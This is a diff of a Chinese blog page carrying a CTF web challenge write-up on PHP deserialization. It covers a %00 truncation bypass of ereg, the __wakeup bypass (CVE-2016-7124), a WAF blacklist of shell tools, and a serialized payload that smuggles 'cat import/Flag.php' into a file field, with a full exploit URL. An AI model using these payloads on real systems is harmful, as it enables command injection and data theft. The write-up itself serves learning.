@@ -14,16 +14,16 @@
 <meta property="og:site_name" content="l1nk3r&#39;s blog">
 <meta property="og:description" content="周末偶然看到学弟们在群里发的一道web题目，心血来潮决定做做，还是学到点东西，做个记录，题目地址。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/w6miq.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/yh5ma.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/zzjrq.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/vumfu.png">
-<meta property="og:image" content="http://po8p59xe5.bkt.clouddn.com/blog/g7c82.png">
-<meta property="og:updated_time" content="2019-03-12T09:07:14.341Z">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/w6miq.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/yh5ma.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/zzjrq.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/vumfu.png">
+<meta property="og:image" content="http://l1nk3r.xmutsec.com/blog/g7c82.png">
+<meta property="og:updated_time" content="2019-04-10T04:41:25.550Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="一道ctf题的总结">
 <meta name="twitter:description" content="周末偶然看到学弟们在群里发的一道web题目，心血来潮决定做做，还是学到点东西，做个记录，题目地址。">
-<meta name="twitter:image" content="http://po8p59xe5.bkt.clouddn.com/blog/w6miq.png">
+<meta name="twitter:image" content="http://l1nk3r.xmutsec.com/blog/w6miq.png">
     
     
         
@@ -158,25 +158,25 @@
 <p><strong>waf.php</strong></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($values)</span></span>&#123;</span><br><span class="line">	<span class="comment">//$black = [];</span></span><br><span class="line">	$black = <span class="keyword">array</span>(<span class="string">'vi'</span>,<span class="string">'awk'</span>,<span class="string">'-'</span>,<span class="string">'sed'</span>,<span class="string">'comm'</span>,<span class="string">'diff'</span>,<span class="string">'grep'</span>,<span class="string">'cp'</span>,<span class="string">'mv'</span>,<span class="string">'nl'</span>,<span class="string">'less'</span>,<span class="string">'od'</span>,<span class="string">'cat'</span>,<span class="string">'head'</span>,<span class="string">'tail'</span>,<span class="string">'more'</span>,<span class="string">'tac'</span>,<span class="string">'rm'</span>,<span class="string">'ls'</span>,<span class="string">'tailf'</span>,<span class="string">' '</span>,<span class="string">'%'</span>,<span class="string">'%0a'</span>,<span class="string">'%0d'</span>,<span class="string">'%00'</span>,<span class="string">'ls'</span>,<span class="string">'echo'</span>,<span class="string">'ps'</span>,<span class="string">'&gt;'</span>,<span class="string">'&lt;'</span>,<span class="string">'$&#123;IFS&#125;'</span>,<span class="string">'ifconfig'</span>,<span class="string">'mkdir'</span>,<span class="string">'cp'</span>,<span class="string">'chmod'</span>,<span class="string">'wget'</span>,<span class="string">'curl'</span>,<span class="string">'http'</span>,<span class="string">'www'</span>,<span class="string">'`'</span>,<span class="string">'printf'</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">foreach</span> ($black <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">		<span class="keyword">if</span>(stripos($values,$value))&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"Attack!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (!ctype_alnum($values)) &#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">"Attack!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <h1 id="0x02考点分析"><a href="#0x02考点分析" class="headerlink" title="0x02考点分析"></a>0x02考点分析</h1><p>  这题的考点有几个，首先ereg正则的情况下，可以同通过%00进行截断绕过。如果要进入下一个循环，ad必须包含–字符，因此这里可以构造ad=123%00–，然后我们就看到最后这个循环里会对secret参数进行反序列化操作。在进行反序列化之前，进行了判断，不允许<code>$secret</code>中出现<code>./</code>。</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/w6miq.png" alt="1"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/w6miq.png" alt="1"></p>
 <h1 id="0x03PHP反序列化"><a href="#0x03PHP反序列化" class="headerlink" title="0x03PHP反序列化"></a>0x03PHP反序列化</h1><p>  这里就先不对PHP反序列化进行详细介绍，后续会针对PHP反序列化问题进行详细说明。跟进反序列化，我们在class.php中看到了，序列化的操作。</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/yh5ma.png" alt="2"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/yh5ma.png" alt="2"></p>
 <p>  在<code>__destruct</code>阶段里执行了system操作，这的system操作存在命令注入的问题，但是在这步操作之前需要做个校验，查看file是否为wakeup.txt，sleep.txt，welcome中的一个，但是在反序化的时候，<code>__wakeup</code>方法会将file赋值为wakeup.txt。</p>
 <p>  这时候关注到一个洞:__wakeup()函数失效引发漏洞(CVE-2016-7124)</p>
 <h2 id="wakeup-函数失效引发漏洞-CVE-2016-7124"><a href="#wakeup-函数失效引发漏洞-CVE-2016-7124" class="headerlink" title="__wakeup()函数失效引发漏洞(CVE-2016-7124)"></a>__wakeup()函数失效引发漏洞(CVE-2016-7124)</h2><p>先看一段小代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Record</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">"Welcome"</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">'wakeup.txt'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'wakeup.txt'</span> &amp;&amp; <span class="keyword">$this</span>-&gt;file != <span class="string">'sleep.txt'</span> &amp;&amp; <span class="keyword">$this</span>-&gt;file != <span class="string">'Welcome'</span>) &#123;</span><br><span class="line">            system(<span class="string">"php ./import/$this-&gt;file.php"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;?php Something destroyed ?&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">$b =new Record();</span></span><br><span class="line"><span class="comment">echo serialize($b);</span></span><br><span class="line"><span class="comment">file_put_contents('1.txt', serialize($b));</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">$c = unserialize(file_get_contents(<span class="string">'1.txt'</span>));</span><br><span class="line"></span><br><span class="line">var_dump($c);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>  生成的序列化字符串为O:6:”Record”:1:{s:4:”file”;s:4:”test”;}。将其重新反序列化后的结果为。</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/zzjrq.png" alt="3"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/zzjrq.png" alt="3"></p>
 <p><strong>漏洞原理</strong></p>
 <p>  而该漏洞的描述是：<code>__wakeup</code>触发于<code>unserilize()</code>调用之前，当我们反序列化一个对象时，如果它的属性发生了变化，就会导致wakeup函数中的return 0不会执行，那么如果__wakeup()中存在一些重要的语句，就会导致不会被执行。</p>
 <p><strong>漏洞影响版本</strong></p>
 <p>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p>
 <p>  将Record:后的1改成2，重新反序列化一下，结果已经绕过这个if判断。</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/vumfu.png" alt="4"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/vumfu.png" alt="4"></p>
 <h1 id="0x04命令注入"><a href="#0x04命令注入" class="headerlink" title="0x04命令注入"></a>0x04命令注入</h1><p>  很简单，构造一下payload为<code>O:6:&quot;Record&quot;:2:{s:4:&quot;file&quot;;s:29:&quot;Flag.php;cat import/Flag.php;&quot;;}</code>。</p>
 <p>  最后:<code>http://47.104.99.231:20003/index2.php?secret=O:6:%22Record%22:2:{s:4:%22file%22;s:29:%22</code></p>
 <p><code>Flag.php;cat%20import/Flag.php;%22;}&amp;ad=1%00--&amp;file=Welcome</code>。</p>
-<p><img src="http://po8p59xe5.bkt.clouddn.com/blog/g7c82.png" alt="5"></p>
+<p><img src="http://l1nk3r.xmutsec.com/blog/g7c82.png" alt="5"></p>
 <h1 id="0x05参考文章"><a href="#0x05参考文章" class="headerlink" title="0x05参考文章"></a>0x05参考文章</h1><p><a href="http://www.venenof.com/index.php/archives/167/" target="_blank" rel="noopener">magic函数__wakeup()引发的漏洞</a></p>
 
   </div>
@@ -252,6 +252,7 @@
         
       </ul>
     </nav>
+    <a href="http://www.miitbeian.gov.cn/">闽ICP备19007817号</a> 
   </div>
 </footer>
 
